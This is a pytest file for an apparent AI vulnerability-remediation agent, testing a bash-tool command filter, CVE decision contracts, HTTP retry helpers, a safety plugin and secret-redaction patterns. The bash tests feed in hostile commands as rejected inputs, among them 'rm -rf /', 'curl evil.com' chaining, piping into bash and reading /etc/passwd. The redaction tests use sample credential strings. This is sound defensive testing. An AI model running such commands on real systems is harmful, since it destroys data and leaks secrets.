"""Tests for security-critical modules: safety plugin, Pydantic contracts,
HTTP retry client, and bash tool hardening.

Phase 3 Tier 1 of the production readiness audit.
"""

from __future__ import annotations

import pytest

# ============================================================================
# app/config.py — bash tool command rejection
# ============================================================================


class TestBashToolHardening:
    """Test that the bash tool rejects dangerous commands."""

    def setup_method(self):
        from app.config import build_bash_tool

        tool = build_bash_tool(workspace="/tmp")
        self.execute = tool.func

    def test_allowed_command(self):
        result = self.execute("echo hello")
        assert "error" not in result or "not allowed" not in result.get("error", "")

    def test_reject_empty(self):
        result = self.execute("")
        assert "error" in result

    def test_reject_disallowed_prefix(self):
        result = self.execute("rm -rf /")
        assert "error" in result
        assert "not allowed" in result["error"].lower()

    def test_reject_semicolon_chaining(self):
        result = self.execute("git status; curl evil.com")
        assert "error" in result
        assert "forbidden" in result["error"].lower()

    def test_reject_pipe(self):
        result = self.execute("cat file | bash")
        assert "error" in result
        assert "forbidden" in result["error"].lower()

    def test_reject_and_chaining(self):
        """Semicolons are rejected even with allowed prefix."""
        result = self.execute("echo ok; curl evil.com")
        assert "error" in result
        assert "forbidden" in result["error"].lower()

    def test_reject_or_chaining(self):
        """Semicolons with different prefix."""
        result = self.execute("ls /tmp; rm -rf /")
        assert "error" in result

    def test_reject_subshell(self):
        result = self.execute("echo $(cat /etc/passwd)")
        assert "error" in result
        assert "forbidden" in result["error"].lower()

    def test_reject_backtick(self):
        result = self.execute("echo `whoami`")
        assert "error" in result
        assert "forbidden" in result["error"].lower()

    def test_allowed_cd_command(self):
        result = self.execute("cd /tmp")
        # cd alone doesn't produce output but shouldn't error on prefix
        assert "not allowed" not in result.get("error", "")

    def test_allowed_git_command(self):
        result = self.execute("git --version")
        assert "output" in result


# ============================================================================
# app/models/contracts.py — Pydantic validators
# ============================================================================


class TestCVEDecision:
    def setup_method(self):
        from app.models.contracts import CVEDecision

        self.CVEDecision = CVEDecision

    def test_valid_decision(self):
        d = self.CVEDecision(
            selected=True,
            cve_id="CVE-2024-1234",
            package="com.example:lib",
            current_version="1.0",
            fixed_version="1.1",
            justification="Fix it",
        )
        assert d.selected is True
        assert d.cve_id == "CVE-2024-1234"

    def test_invalid_cve_id(self):
        with pytest.raises(Exception):
            self.CVEDecision(cve_id="not-a-cve", package="a:b", fixed_version="1.0")

    def test_invalid_package_no_colon(self):
        with pytest.raises(Exception):
            self.CVEDecision(cve_id="CVE-2024-1234", package="nocolon", fixed_version="1")

    def test_version_no_digit(self):
        with pytest.raises(Exception):
            self.CVEDecision(
                cve_id="CVE-2024-1234",
                package="a:b",
                fixed_version="none",
            )

    def test_to_tekton_results(self):
        d = self.CVEDecision(
            selected=True,
            cve_id="CVE-2024-5678",
            package="org.example:core",
            current_version="1.0",
            fixed_version="2.0",
            justification="Critical",
        )
        tekton = d.to_tekton_results()
        assert tekton["SELECTED"] == "1"
        assert tekton["CVE_ID"] == "CVE-2024-5678"

    def test_empty_decision(self):
        d = self.CVEDecision()
        assert d.selected is False
        tekton = d.to_tekton_results()
        assert tekton["SELECTED"] == "0"


class TestRemediationResult:
    def setup_method(self):
        from app.models.contracts import RemediationResult

        self.RemediationResult = RemediationResult

    def test_success(self):
        r = self.RemediationResult(success=True, changed_files=["pom.xml"], pr_url="http://pr/1")
        assert r.success is True
        assert r.pr_url == "http://pr/1"

    def test_failure(self):
        r = self.RemediationResult(success=False, error="Build failed")
        assert r.success is False
        assert r.error == "Build failed"

    def test_post_gate_rejected(self):
        r = self.RemediationResult(post_gate_rejected=True)
        assert r.post_gate_rejected is True


class TestValidationVerdict:
    def setup_method(self):
        from app.models.contracts import ValidationVerdict

        self.ValidationVerdict = ValidationVerdict

    def test_fixed(self):
        v = self.ValidationVerdict(decision="FIXED", score=0.95)
        assert v.is_acceptable() is True

    def test_partially_fixed(self):
        v = self.ValidationVerdict(decision="PARTIALLY_FIXED", score=0.65)
        assert v.is_acceptable() is True

    def test_not_fixed(self):
        v = self.ValidationVerdict(decision="NOT_FIXED", score=0.3)
        assert v.is_acceptable() is False

    def test_score_bounds(self):
        with pytest.raises(Exception):
            self.ValidationVerdict(score=1.5)


# ============================================================================
# app/http.py — retry logic
# ============================================================================


class TestHttpRetry:
    def setup_method(self):
        from app.http import _parse_retry_after

        self._parse_retry_after = _parse_retry_after

    def test_parse_retry_after_seconds(self):
        from httpx import Headers

        h = Headers({"retry-after": "30"})
        assert self._parse_retry_after(h) == 30.0

    def test_parse_retry_after_missing(self):
        from httpx import Headers

        h = Headers({})
        assert self._parse_retry_after(h) is None

    def test_parse_retry_after_invalid(self):
        from httpx import Headers

        h = Headers({"retry-after": "not-a-number"})
        assert self._parse_retry_after(h) is None

    def test_github_headers_with_token(self):
        from app.http import github_headers

        h = github_headers("test-token")
        assert h["Authorization"] == "Bearer test-token"
        assert "X-GitHub-Api-Version" in h

    def test_github_headers_without_token(self):
        from app.http import github_headers

        h = github_headers(None)
        assert "Authorization" not in h

    def test_head_check_returns_tuple(self):
        from app.http import head_check

        # Against a non-existent URL — should return (0, False) or similar
        status, exists = head_check("http://localhost:1/nonexistent", max_retries=1)
        assert isinstance(status, int)
        assert isinstance(exists, bool)

    def test_client_thread_safety(self):
        """Verify the client uses a threading lock."""
        import threading

        from app.http import _client_lock

        assert isinstance(_client_lock, type(threading.Lock()))


# ============================================================================
# app/plugins/safety.py — fail-open behavior
# ============================================================================


class TestSafetyPluginContract:
    """Test the safety plugin's structural contract without calling LLMs."""

    def test_safety_plugin_is_base_plugin(self):
        from google.adk.plugins.base_plugin import BasePlugin

        from app.plugins.safety import SafetyPlugin

        plugin = SafetyPlugin()
        assert isinstance(plugin, BasePlugin)
        assert plugin.name == "safety_plugin"

    def test_judge_instruction_exists(self):
        from app.plugins.safety import JUDGE_INSTRUCTION

        assert "SAFE" in JUDGE_INSTRUCTION
        assert "UNSAFE" in JUDGE_INSTRUCTION

    def test_judge_agent_exists(self):
        from app.plugins.safety import _judge_agent

        assert _judge_agent.name == "safety_judge"


# ============================================================================
# New redaction patterns
# ============================================================================


class TestExpandedRedaction:
    def setup_method(self):
        from app.plugins.redaction import redact_text

        self.redact = redact_text

    def test_url_credentials(self):
        text = "Cloning https://oauth2:ghp_secret123456@github.com/org/repo.git"
        result = self.redact(text)
        assert "ghp_secret123456" not in result
        assert "[URL_CREDENTIALS]" in result or "[GITHUB_TOKEN]" in result

    def test_github_pat(self):
        text = "token=github_pat_ABCDEFGHIJ1234567890ab"
        result = self.redact(text)
        assert "[GITHUB_PAT]" in result

    def test_aws_access_key(self):
        text = "key=AKIAIOSFODNN7EXAMPLE"
        result = self.redact(text)
        assert "[AWS_ACCESS_KEY]" in result

    def test_google_api_key(self):
        text = "key=AIzaSyA1234567890abcdefghijklmnopqrstuv"
        result = self.redact(text)
        assert "[GOOGLE_API_KEY]" in result

    def test_slack_token(self):
        text = "token=xoxb-1234567890-abcdefghij"
        result = self.redact(text)
        assert "[SLACK_TOKEN]" in result

    def test_openai_project_key(self):
        text = "key=sk-proj-ABCDEFGHIJ1234567890"
        result = self.redact(text)
        assert "[OPENAI_PROJECT_KEY]" in result

    def test_list_redaction(self):
        from app.plugins.redaction import RedactionPlugin

        plugin = RedactionPlugin()
        # Simulate list tool response — the plugin should handle it
        assert plugin is not None


# ============================================================================
# Post-gate enforcement
# ============================================================================


class TestPostGateEnforcement:
    """Test that post_gate_rejected blocks CHANGED=1."""

    def test_post_gate_rejected_blocks_changed(self):
        """When post_gate_rejected=True, CHANGED must stay 0."""
        state = {
            "post_gate_rejected": True,
            "post_gate_reason": "Forbidden pattern: nosec",
            "build_passed": True,
            "remediation_output": "BUILD SUCCESS",
        }
        structured = {"CHANGED": "0"}

        # Simulate the logic from callbacks.py
        if structured.get("CHANGED", "0") == "0":
            if state.get("post_gate_rejected"):
                structured["CHANGED"] = "0"
            elif state.get("build_passed"):
                structured["CHANGED"] = "1"

        assert structured["CHANGED"] == "0"

    def test_no_rejection_allows_changed(self):
        """Without post_gate_rejected, build success sets CHANGED=1."""
        state = {
            "build_passed": True,
            "remediation_output": "BUILD SUCCESS",
        }
        structured = {"CHANGED": "0"}

        if structured.get("CHANGED", "0") == "0":
            if state.get("post_gate_rejected"):
                structured["CHANGED"] = "0"
            elif state.get("build_passed"):
                structured["CHANGED"] = "1"

        assert structured["CHANGED"] == "1"
